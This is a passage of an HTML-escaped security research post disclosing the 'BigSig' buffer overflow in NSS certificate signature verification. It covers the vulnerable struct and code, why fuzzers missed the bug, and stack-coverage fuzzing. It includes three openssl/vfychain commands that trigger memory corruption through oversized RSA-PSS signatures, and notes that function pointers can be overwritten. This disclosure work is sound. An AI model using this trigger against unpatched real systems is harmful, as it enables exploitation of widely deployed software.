c8"&gt;&amp;nbsp;*wincx;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;void&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;*hashcx;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;const&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c18"&gt;SECHashObject&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;*&lt;/span&gt;&lt;span class="c7"&gt;hashobj&lt;/span&gt;&lt;span class="c7 c8"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c18"&gt;SECOidTag&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;encAlg; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c21 c48"&gt;/* enc alg */&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c18"&gt;PRBool&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;hasSignature;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c18"&gt;SECItem&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;*params;&lt;/span&gt;&lt;/p&gt; &lt;p class="c34"&gt;&lt;span class="c7"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3 c16 c33 subtitle" id="h.scw51sqnutu4"&gt;&lt;span class="c32"&gt;Fig 1&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class="c21"&gt;VFYContext&lt;/span&gt;&lt;span class="c30 c8"&gt;&amp;nbsp;structure from NSS.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c13"&gt;&lt;span&gt;&lt;br&gt;The maximum size signature that this structure can handle is whatever the largest union member is, in this case that&amp;rsquo;s RSA at &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/freebl/blapit.h#139"&gt;2048 bytes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;That&amp;rsquo;s 16384 bits, large enough to accommodate signatures from even the most ridiculously oversized keys.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;Okay, but what happens if you just....make a signature that&amp;rsquo;s bigger than that?&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;Well, it turns out the answer is memory corruption. Yes, really.&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;&lt;br&gt;The untrusted signature is simply copied into this fixed-sized buffer, overwriting adjacent members with arbitrary attacker-controlled data.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;The bug is simple to reproduce and affects multiple algorithms. The easiest to demonstrate is RSA-PSS. In fact, just these three commands work:&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.488dd1b55b75f3df66e36d7bc8b67538aa8c4fd3"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c14"&gt;&lt;tbody&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c5"&gt;# We need 16384 bits to fill the buffer, then 32 + 64 + 64 + 64 bits to overflow to &lt;/span&gt;&lt;span class="c5"&gt;hashobj&lt;/span&gt;&lt;span class="c5 c8"&gt;, &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5 c8"&gt;# which contains function pointers (bigger would work too, but takes longer to generate).&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c21 c25"&gt;$ openssl &lt;/span&gt;&lt;span class="c21 c25"&gt;genpkey&lt;/span&gt;&lt;span class="c21 c25"&gt;&amp;nbsp;-algorithm rsa-pss -pkeyopt rsa_keygen_bits:$((16384 + 32 + 64 + 64 + 64)) -pkeyopt rsa_keygen_primes:5 -out &lt;/span&gt;&lt;span class="c21 c25"&gt;bigsig.key&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5 c8"&gt;# Generate a self-signed certificate from that key&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c21 c36 c25"&gt;$ openssl req -x509 -new -key bigsig.key -subj &amp;quot;/CN=BigSig&amp;quot; -sha256 -out bigsig.cer&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c5 c8"&gt;# Verify it with NSS...&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c21 c25"&gt;$ &lt;/span&gt;&lt;span class="c21 c25"&gt;vfychain&lt;/span&gt;&lt;span class="c8 c21 c36 c25"&gt;&amp;nbsp;-a bigsig.cer &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c8 c21 c25 c36"&gt;Segmentation fault&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3 c33 c16 subtitle" id="h.48dytsqrxb61"&gt;&lt;span class="c32"&gt;Fig 2&lt;/span&gt;&lt;span class="c30 c8"&gt;. Reproducing the BigSig vulnerability in three easy commands.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;The actual code that does the corruption varies based on the algorithm; &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/mozilla-central/rev/f8576fec48d866c5f988baaf1fa8d2f8cce2a82f/security/nss/lib/cryptohi/secvfy.c#477"&gt;here is the code&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;for RSA-PSS. The bug is that there is simply no bounds checking at all; &lt;/span&gt;&lt;span class="c21"&gt;sig&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c21"&gt;key&lt;/span&gt;&lt;span&gt;&amp;nbsp;are &amp;nbsp;arbitrary-length, attacker-controlled blobs, and &lt;/span&gt;&lt;span class="c21"&gt;cx-&amp;gt;u&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;is a fixed-size buffer.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.5f5007590f34efd7a404c6d3f020f980f0b97070"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c14"&gt;&lt;tbody&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;case&lt;/span&gt;&lt;span class="c7"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c7"&gt;rsaPssKey&lt;/span&gt;&lt;span class="c7 c8"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c8"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sigLen = SECKEY_SignatureLen(key);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;if&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;(sigLen == 0) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c21 c48"&gt;/* error set by SECKEY_SignatureLen */&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c8"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;rv = SECFailure;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;break&lt;/span&gt;&lt;span class="c7 c8"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c8"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c31"&gt;&lt;span class="c7 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;if&lt;/span&gt;&lt;span class="c7 c8"&gt;&amp;nbsp;(sig-&amp;gt;len != sigLen) {&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c8"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_SetError(SEC_ERROR_BAD_SIGNATURE);&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c8"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;rv = SECFailure;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;break&lt;/span&gt;&lt;span class="c7 c8"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c8"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c31"&gt;&lt;span class="c7 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c8"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;PORT_Memcpy(cx-&amp;gt;u.buffer, sig-&amp;gt;data, sigLen);&lt;/span&gt;&lt;/p&gt; &lt;p class="c34"&gt;&lt;span class="c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class="c10"&gt;break&lt;/span&gt;&lt;span class="c7"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3 c33 c16 subtitle" id="h.b383i7m17o2u"&gt;&lt;span class="c32"&gt;Fig 3&lt;/span&gt;&lt;span&gt;. The signature size must match the size of the key, but there are no other limitations. &lt;/span&gt;&lt;span class="c21"&gt;cx-&amp;gt;u&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a fixed-size buffer, and &lt;/span&gt;&lt;span class="c21"&gt;sig&lt;/span&gt;&lt;span class="c30 c8"&gt;&amp;nbsp;is an arbitrary-length, attacker-controlled blob.&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;I think this vulnerability raises a few immediate questions:&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_2fd9br43vo52-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Was this a recent code change or regression that hadn&amp;rsquo;t been around long enough to be discovered? &lt;/span&gt;&lt;span class="c32"&gt;No&lt;/span&gt;&lt;span&gt;, the original code was &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://hg.mozilla.org/projects/nss/annotate/41f5eb9e5df23951883ba3243f3ae51550663d77/security/nss/lib/cryptohi/secvfy.c#l158"&gt;checked in&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with ECC support on the 17th October 2003, but wasn&amp;#39;t exploitable until some &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://hg.mozilla.org/projects/nss/diff/10393/security/nss/lib/cryptohi/seckey.c#l1.63"&gt;refactoring&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in June 2012. In 2017, RSA-PSS support was &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://hg.mozilla.org/projects/nss/rev/84e886ea090e36c69df58a71665a97bd25c62d02"&gt;added&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;and made the same error.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_81cegzboe9ky-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Does this bug require a long time to generate a key that triggers the bug? &lt;/span&gt;&lt;span class="c32"&gt;No&lt;/span&gt;&lt;span&gt;, the example above generates a real key and signature, but it can just be garbage as the overflow happens before the signature check. A few kilobytes of &lt;/span&gt;&lt;span class="c21"&gt;A&lt;/span&gt;&lt;span&gt;&amp;rsquo;s works just fine.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_2gk0zovl15u8-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Does reaching the vulnerable code require some complicated state that fuzzers and static analyzers would have difficulty synthesizing, like hashes or checksums? &lt;/span&gt;&lt;span class="c32"&gt;No&lt;/span&gt;&lt;span&gt;, it has to &lt;/span&gt;&lt;span&gt;be well-formed&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;DER, that&amp;rsquo;s about it.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_z8xtsan2wa5s-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Is this an uncommon code path? &lt;/span&gt;&lt;span class="c32"&gt;No&lt;/span&gt;&lt;span&gt;, Firefox does not use this code path for RSA-PSS signatures, but the default entrypoint for certificate verification in NSS, &lt;/span&gt;&lt;span class="c21"&gt;CERT_VerifyCertificate(),&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;is vulnerable.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_oetzaqvyxxoa-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Is it specific to the RSA-PSS algorithm? &lt;/span&gt;&lt;span class="c32"&gt;No&lt;/span&gt;&lt;span class="c11 c8"&gt;, it also affects DSA signatures.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_prwgb47nvxz6-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Is it unexploitable, or otherwise limited impact? &lt;/span&gt;&lt;span class="c32"&gt;No&lt;/span&gt;&lt;span&gt;, the &lt;/span&gt;&lt;span class="c21"&gt;hashobj&lt;/span&gt;&lt;span class="c21"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;member can be clobbered. That object contains &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/mozilla-central/rev/41a8c58186206985c0d70d3d460c04ac844d11d0/security/nss/lib/util/hasht.h#45"&gt;function pointers&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;which are used immediately.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c32"&gt;This wasn&amp;rsquo;t a process failure, the vendor did everything right&lt;/span&gt;&lt;span&gt;. Mozilla has a mature, world-class security team. They pioneered &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://www.mozilla.org/en-US/security/bug-bounty/"&gt;bug bounties&lt;/a&gt;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;invest&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://research.mozilla.org/rust/"&gt;memory safety&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, fuzzing and &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://coverage.moz.tools/"&gt;test coverage&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;NSS was one of the very first projects included with &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://google.github.io/oss-fuzz/"&gt;oss-fuzz&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, it was officially supported since at least &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://github.com/google/oss-fuzz/commit/3d325bf20f0b09961b6c7de34aa4da0d16cfa67d"&gt;October 2014&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Mozilla also fuzz NSS themselves with &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://llvm.org/docs/LibFuzzer.html"&gt;libFuzzer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and have contributed their own &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://searchfox.org/mozilla-central/source/security/nss/fuzz/asn1_mutators.cc"&gt;mutator&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;collection and distilled &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://github.com/mozilla/nss-fuzzing-corpus"&gt;coverage corpus&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. There is an extensive testsuite, and nightly &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://firefox-source-docs.mozilla.org/tools/sanitizer/asan.html"&gt;ASAN&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;builds.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;I&amp;#39;m generally skeptical of static analysis, but this seems like a simple missing bounds check that should be easy to find. Coverity has been monitoring NSS since at least &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://scan.coverity.com/projects/nss"&gt;December 2008&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and also &lt;/span&gt;&lt;span&gt;appears&lt;/span&gt;&lt;span class="c11 c8"&gt;&amp;nbsp;to have failed to discover this.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;Until 2015, Google Chrome &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://chromium.googlesource.com/chromium/third_party/nss/+/refs/heads/master/README.chromium"&gt;used&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;NSS, and maintained their own testsuite and fuzzing infrastructure independent of Mozilla. Today, Chrome platforms use &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://boringssl.googlesource.com/boringssl/"&gt;BoringSSL&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;, but the NSS port is still maintained.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_ohd9cwgi2ci1-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Did Mozilla have good test coverage for the vulnerable areas? &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://coverage.moz.tools/#revision=latest&amp;path=security%2Fnss%2Flib%2Fcryptohi%2Fsecvfy.c&amp;suite=gtest&amp;view=file&amp;line=201"&gt;YES&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Did Mozilla/chrome/oss-fuzz have relevant inputs in their fuzz corpus? &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://storage.googleapis.com/oss-fuzz-coverage/nss/reports/20211027/linux/src/nss/lib/cryptohi/secvfy.c.html#L201"&gt;YES&lt;/a&gt;&lt;/span&gt;&lt;span class="c11 c8"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Is there a mutator capable of extending &lt;/span&gt;&lt;span&gt;ASN1_ITEM&lt;/span&gt;&lt;span&gt;s? &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://codereview.chromium.org/1677803002/patch/180001/190008"&gt;YES&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c13 c27 li-bullet-0"&gt;&lt;span&gt;Is this an &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://github.com/google/sanitizers/wiki/AddressSanitizerIntraObjectOverflow"&gt;intra-object overflow&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, or other form of corruption that ASAN would have difficulty detecting? NO, it&amp;#39;s a textbook buffer overflow that ASAN can easily detect.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13 c16" id="h.rdx8pm6yen5"&gt;&lt;span class="c24 c8"&gt;How did I find the bug?&lt;/span&gt;&lt;/h1&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span class="c11 c8"&gt;I&amp;#39;ve been experimenting with alternative methods for measuring code coverage, to see if any have any practical use in fuzzing. The fuzzer that discovered this vulnerability used a combination of two approaches, stack coverage and object isolation.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c13 c16" id="h.j6f1q7cn6h69"&gt;&lt;span class="c24 c8"&gt;Stack Coverage&lt;/span&gt;&lt;/h2&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c13"&gt;&lt;span&gt;The most common method of measuring code coverage is block coverage, or &lt;/span&gt;&lt;span class="c26"&gt;&lt;a class="c91" href="https://clang.llvm.org/docs/SanitizerCoverage.html#edge-coverage"&gt;edge coverage&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;when source code is available. I&amp;rsquo;ve been curious if that is always sufficient. For example, consider a simple dispatch table with a combination of trusted and untrusted parameters, as in &lt;/span&gt;&lt;span class="c32"&gt;Fig 4&lt;/span&gt;&lt;span class="c11 c8"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c11 c8"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.bd548b01b21e1cf0cdd7eaa859aff19f6d0661e5"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c14"&gt;&lt;tbody&gt;&lt;tr class="c29"&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c3"&gt;&lt;span class="c23 c21"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c23 c21"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c23 c21"&gt;#include &amp;lt;limits.h&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1 c8"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c12"&gt;static&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;char&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class="c19"&gt;[&lt;/span&gt;&lt;span class="c21 c51"&gt;128&lt;/span&gt;&lt;span class="c19"&gt;]&lt;/span&gt;&lt;span class="c23 c21"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1 c8"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c12"&gt;void&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;cmd_handler_foo&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c12"&gt;int&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c12"&gt;size_t&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c19"&gt;{&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="c28 c21"&gt;memset&lt;/span&gt;&lt;span class="c19"&gt;(&lt;/span&gt;&lt;span class="c1"&gt;buf&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;a&lt;/span&gt;&lt;span class="c23 c21"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;b&lt;/span&gt;&lt;span class="c19"&gt;)&lt;/span&gt;&lt;span class="c23 c21"&gt;;&lt;/span&gt;&lt;span 